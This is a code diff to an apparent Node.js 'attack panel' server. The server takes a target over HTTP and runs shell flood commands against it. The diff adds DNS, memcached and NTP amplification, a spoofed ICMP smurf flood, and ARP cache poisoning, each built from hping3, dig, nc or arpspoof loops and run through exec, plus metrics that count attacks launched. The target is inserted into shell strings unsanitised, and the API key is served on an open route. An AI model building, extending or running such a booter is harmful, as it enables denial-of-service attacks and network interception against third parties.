@@ -7,6 +7,7 @@ const os = require('os');
 const publicIp = require('public-ip');
 const rateLimit = require('express-rate-limit');
 const crypto = require('crypto');
+const promClient = require('prom-client');
 
 app.use(express.static('public'));
 app.use(express.urlencoded({ extended: true }));
@@ -14,6 +15,21 @@ app.use(express.json());
 
 const logFilePath = path.join(__dirname, 'logs.txt');
 const apiKey = crypto.randomBytes(32).toString('hex');
+const registry = new promClient.Registry();
+
+const attackCounter = new promClient.Counter({
+    name: 'noodles_attacks_total',
+    help: 'Total number of attacks launched',
+    labelNames: ['attackType', 'target'],
+    registers: [registry]
+});
+
+const attackDurationGauge = new promClient.Gauge({
+    name: 'noodles_attack_duration_seconds',
+    help: 'Duration of the last attack in seconds',
+    labelNames: ['attackType', 'target'],
+    registers: [registry]
+});
 
 const log = (message) => {
     const timestamp = new Date().toISOString();
@@ -40,6 +56,7 @@ app.post('/attack', async (req, res) => {
     const duration = parseInt(req.body.duration) || 60;
     const intensity = parseInt(req.body.intensity) || 100;
     const userApiKey = req.headers['x-api-key'];
+    const bypass = req.body.bypass || false;
 
     if (userApiKey !== apiKey) {
         log('Error: Unauthorized API key.');
@@ -116,6 +133,32 @@ app.post('/attack', async (req, res) => {
              command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --icmp --flood --rand-source ${encodedTarget} & done; done"`;
              break;
 
+        case 'dns_amp':
+             const resolverIp = '8.8.8.8';
+             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do dig @${resolverIp} ${target} ANY +dnssec & done; done"`;
+             break;
+
+        case 'memcached_amp':
+             const memcachedServer = '127.0.0.1:11211';
+             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do echo -en '\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00get stats\\r\\n' | nc -u ${target} 11211 & done; done"`;
+             break;
+
+        case 'ntp_amp':
+             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do ntpq -n -c monlist ${target} & done; done"`;
+             break;
+
+        case 'icmp_smurf':
+             const broadcastAddress = target.split('.').slice(0, 3).join('.') + '.255';
+             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --icmp --flood --rand-source -a ${target} ${broadcastAddress} & done; done"`;
+             break;
+
+        case 'arp_cache_poisoning':
+             const gatewayIp = '192.168.1.1';
+             const victimIp = target;
+             const attackerMac = '00:11:22:33:44:55';
+             command = `timeout ${duration} bash -c "while true; do arpspoof -i eth0 -t ${victimIp} ${gatewayIp} & arpspoof -i eth0 -t ${gatewayIp} ${victimIp} & done"`;
+             break;
+
         default:
             log(`Error: Invalid attack type: ${attackType}`);
             return res.status(400).send('Invalid attack type.');
@@ -123,7 +166,14 @@ app.post('/attack', async (req, res) => {
 
     log(`Initiating ${attackType} attack on ${target} for ${duration} seconds with intensity ${intensity}.`);
 
+    attackCounter.inc({ attackType: attackType, target: target });
+    const attackStartTime = Date.now();
+
     exec(command, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
+        const attackEndTime = Date.now();
+        const actualDuration = (attackEndTime - attackStartTime) / 1000;
+        attackDurationGauge.set({ attackType: attackType, target: target }, actualDuration);
+
         if (error) {
             log(`Attack failed: ${error.message}`);
             console.error(`exec error: ${error}`);
@@ -153,6 +203,12 @@ app.get('/logs', (req, res) => {
 
 app.get('/api-key', (req, res) => {
     res.send({ apiKey: apiKey });
+});
+
+app.get('/metrics', async (req, res) => {
+    res.setHeader('Content-Type', registry.contentType);
+    const metrics = await registry.metrics();
+    res.send(metrics);
 });
 
 const PORT = process.env.PORT || 3000;
